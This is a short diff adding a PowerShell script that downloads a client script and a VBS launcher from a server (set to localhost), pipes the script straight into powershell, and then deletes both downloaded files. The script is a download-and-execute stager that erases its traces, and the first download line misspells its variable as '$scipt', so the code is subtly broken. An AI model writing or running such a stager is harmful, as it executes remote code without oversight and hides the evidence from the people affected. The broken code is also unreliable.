@@ -1,0 +1,11 @@
+$server = 'localhost'
+$script = 'powershell-client.ps1'
+$launcher = 'launcher.vbs'
+
+Invoke-RestMethod $server/$scipt -OutFile $script
+Invoke-RestMethod $server/$launcher -OutFile $launcher
+
+cat $script | powershell
+
+rm $script
+rm $launcher
